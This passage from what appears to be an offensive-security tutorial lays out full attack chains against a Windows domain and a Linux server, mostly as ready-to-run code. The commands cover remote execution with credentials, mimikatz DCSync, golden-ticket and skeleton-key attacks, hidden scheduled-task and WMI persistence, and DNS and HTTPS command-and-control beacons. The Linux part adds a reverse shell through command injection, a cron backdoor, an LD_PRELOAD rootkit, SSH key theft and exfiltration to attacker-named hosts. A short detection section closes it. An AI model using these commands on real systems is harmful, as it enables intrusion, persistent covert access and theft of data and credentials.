Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock {whoami}

# WMI execution
wmic /node:192.168.1.50 /user:CORP\Administrator /password:Password123 process call create "cmd.exe /c powershell <command>"

# PSExec-style with built-in tools
sc \\192.168.1.50 create RemoteService binpath= "cmd.exe /c powershell <command>"
sc \\192.168.1.50 start RemoteService
```

#### Phase 5: Domain Dominance

**Step 10: DCSync Attack**
```powershell
# Once you have domain admin or replication rights
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"

# This extracts the krbtgt hash for Golden Ticket creation
```

**Step 11: Golden Ticket Creation**
```powershell
# Create ticket that grants access to entire domain
mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /user:fakeadmin /ptt" "exit"

# Now you can access any resource as any user
dir \\DC01\C$
```

#### Phase 6: Persistence

**Step 12: Scheduled Task Persistence**
```powershell
# Create legitimate-looking scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Enc <base64>"
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsSystemMaintenance" -Action $action -Trigger $trigger -Principal $principal
```

**Step 13: WMI Event Subscription**
```powershell
# Create WMI event that survives reboots
$FilterArgs = @{name='WindowsUpdateFilter'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$Filter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='WindowsUpdateConsumer'; CommandLineTemplate="powershell.exe -NoP -W Hidden -Enc <base64>"}
$Consumer = New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{Filter = [Ref]$Filter; Consumer = [Ref]$Consumer}
New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

**Step 14: Domain Persistence - Skeleton Key**
```powershell
# Install Skeleton Key on Domain Controller (requires DC access)
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# Now any user can authenticate with password "mimikatz"
```

#### Phase 7: Command & Control

**Step 15: Establish Covert C2 Channel**
```powershell
# DNS tunneling beacon
while($true) {
    $cmd = (nslookup -type=txt beacon.attacker.com 8.8.8.8 | Select-String "text =").ToString().Split('"')[1]
    if($cmd) { 
        $result = Invoke-Expression $cmd | Out-String
        # Exfil result via chunked DNS queries
    }
    Start-Sleep 300
}

# HTTPS beacon (common C2 pattern)
while($true) {
    $tasks = Invoke-RestMethod -Uri "https://legitimate-looking-domain.com/api/updates" -Method GET
    $tasks | ForEach-Object { 
        $output = Invoke-Expression $_.command
        Invoke-RestMethod -Uri "https://legitimate-looking-domain.com/api/results" -Method POST -Body $output
    }
    Start-Sleep 300
}
```

#### Phase 8: Data Exfiltration

**Step 16: Locate and Stage Sensitive Data**
```powershell
# Search for sensitive files
Get-ChildItem -Path C:\ -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match 'password|confidential|secret|finance'}

# Stage data
$compress = @{
    Path = "C:\SensitiveData\*"
    CompressionLevel = "Optimal"
    DestinationPath = "C:\temp\update.zip"
}
Compress-Archive @compress
```

**Step 17: Exfiltrate via HTTPS**
```powershell
# Split file into chunks to avoid detection
$bytes = [System.IO.File]::ReadAllBytes("C:\temp\update.zip")
$chunkSize = 1MB
for($i=0; $i -lt $bytes.Length; $i+=$chunkSize) {
    $chunk = $bytes[$i..([Math]::Min($i+$chunkSize-1, $bytes.Length-1))]
    $base64 = [Convert]::ToBase64String($chunk)
    Invoke-RestMethod -Uri "https://attacker-cdn.com/upload" -Method POST -Body $base64
    Start-Sleep 60  # Slow and steady
}
```

### Scenario: Linux Server Compromise

#### Phase 1: Initial Access

**Step 1: Web Application Exploitation**
```bash
# Exploiting vulnerable web app (e.g., command injection)
curl "http://target.com/search?q=test;whoami"
curl "http://target.com/search?q=test;bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"

# Listener on attacker machine
nc -lvnp 4444
```

**Step 2: Upgrade Shell & Situational Awareness**
```bash
# Upgrade to interactive TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Enumerate system
id
uname -a
cat /etc/os-release
sudo -l
```

#### Phase 2: Privilege Escalation

**Step 3: Search for Privesc Vectors**
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check sudo permissions
sudo -l

# Look for writable directories in PATH
echo $PATH | tr ':' '\n' | xargs -I {} sh -c 'test -w {} && echo {}'

# Check for capabilities
getcap -r / 2>/dev/null

# Enumeration script
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

**Step 4: Exploit SUID Binary**
```bash
# Example: vim has SUID bit set
/usr/bin/vim -c ':!/bin/bash'

# Example: Exploiting PATH manipulation
echo '#!/bin/bash
bash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
sudo /usr/bin/backup-script  # This calls 'tar' without full path
```

#### Phase 3: Persistence

**Step 5: SSH Key Persistence**
```bash
# Generate SSH key pair
ssh-keygen -t rsa -f /tmp/key -N ""

# Add public key to root's authorized_keys
mkdir -p /root/.ssh
cat /tmp/key.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Copy private key to attacker machine for later use
cat /tmp/key  # Copy this
```

**Step 6: Cron Job Backdoor**
```bash
# Add to root crontab
echo '@reboot /usr/local/bin/.system-update > /dev/null 2>&1' >> /var/spool/cron/crontabs/root

# Create the backdoor script
cat > /usr/local/bin/.system-update << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.5/443 0>&1
EOF
chmod +x /usr/local/bin/.system-update
```

**Step 7: Library Preload Rootkit**
```bash
# Simple LD_PRELOAD rootkit to hide processes
cat > /tmp/hide.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

struct dirent *(*old_readdir)(DIR *);

struct dirent *readdir(DIR *dir) {
    struct dirent *entry;
    old_readdir = dlsym(RTLD_NEXT, "readdir");
    while ((entry = old_readdir(dir)) != NULL) {
        if (strstr(entry->d_name, "malicious") == NULL)
            return entry;
    }
    return NULL;
}
EOF

gcc -shared -fPIC /tmp/hide.c -o /lib/x86_64-linux-gnu/.libc-hidden.so -ldl
echo "/lib/x86_64-linux-gnu/.libc-hidden.so" >> /etc/ld.so.preload
```

#### Phase 4: Lateral Movement

**Step 8: SSH Key Harvesting**
```bash
# Search for SSH private keys
find / -name id_rsa 2>/dev/null
find / -name id_ed25519 2>/dev/null
find /home -name authorized_keys 2>/dev/null

# Check for keys without passphrases
for key in $(find /home -name id_rsa); do
    echo "Testing $key"
    ssh -i $key -o PasswordAuthentication=no localhost whoami 2>/dev/null && echo "No passphrase: $key"
done
```

**Step 9: Use Stolen Keys**
```bash
# Copy key to attacker machine
cat /home/devuser/.ssh/id_rsa

# On attacker machine
chmod 600 stolen_key
ssh -i stolen_key devuser@192.168.1.100

# Check where this key works
for ip in $(seq 1 254); do
    ssh -i stolen_key -o ConnectTimeout=2 -o PasswordAuthentication=no devuser@192.168.1.$ip whoami 2>/dev/null && echo "Access: 192.168.1.$ip"
done
```

#### Phase 5: Credential Harvesting

**Step 10: Search for Credentials**
```bash
# Look for plaintext credentials
grep -r "password" /var/www/html 2>/dev/null
grep -r "PASS\|PASSWORD\|SECRET" /opt 2>/dev/null
find /home -name "*.conf" -exec grep -l "password" {} \;

# Check common locations
cat /var/www/html/config.php
cat /opt/app/.env
cat ~/.bash_history
cat ~/.mysql_history

# Database connection strings
find / -name "database.yml" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
```

**Step 11: Memory Dumping (if applicable)**
```bash
# Dump process memory (requires root)
gcore <pid_of_interesting_process>
strings core.<pid> | grep -i "password\|token\|key"

# Extract from running process
cat /proc/<pid>/environ | tr '\0' '\n'
```

#### Phase 6: Exfiltration

**Step 12: Data Staging and Compression**
```bash
# Find and stage sensitive data
find /home /var/www /opt -type f \( -name "*.sql" -o -name "*.db" -o -name "*backup*" \) -exec cp {} /tmp/.stage/ \; 2>/dev/null

# Compress with password
tar czf - /tmp/.stage | openssl enc -aes-256-cbc -salt -out /tmp/update.tar.gz.enc -pass pass:SecretKey123
```

**Step 13: Exfiltrate Data**
```bash
# Method 1: HTTPS POST
curl -X POST -F "file=@/tmp/update.tar.gz.enc" https://attacker-server.com/upload

# Method 2: DNS exfiltration (for very restricted environments)
xxd -p /tmp/data | fold -w 32 | while read line; do
    dig $line.exfil.attacker.com @attacker-dns-server
done

# Method 3: ICMP tunneling
# Using ptunnel or similar tool
```

### Detection Considerations

**What defenders would see:**
- Event ID 4688 (Process Creation) with suspicious command lines
- Event ID 4624 (Logon) Type 3 from unusual sources
- Event ID 4672 (Special Privileges Assigned)
- Unusual LSASS access attempts
- Scheduled task creation by non-admin users
- Kerberos TGS-REQ without prior TGT
- Unusual network connections or DNS patterns
- Large outbound data transfers

**Key detection opportunities:**
- Monitoring for LSASS dumps (Sysmon Event ID 10)
- Detecting credential dumping tools (Sysmon Event ID 1, process creation)
- Tracking lateral movement via RPC/SMB (Sysmon Event ID 3, network connections)
- Monitoring scheduled task creation (Event ID 4698)
- Detecting DCSync by monitoring replication requests from non-DC systems
- Tracking WMI event subscriptions (Sysmon Event ID 19-21)

---

## Additional Resources

These concepts map directly to the **MITRE ATT&CK framework**. For hands-on practice, consider lab environments using tools like:
- **Reconnaissance:** BloodHound, PowerView, SharpHound
- **Exploitation:** Impacket, Metasploit, CrackMapExec
- **Credential Access:** Mimikatz, LaZagne, Rubeus
- **C2 Frameworks:** Sliver, Havoc, Mythic (open-source alternatives)
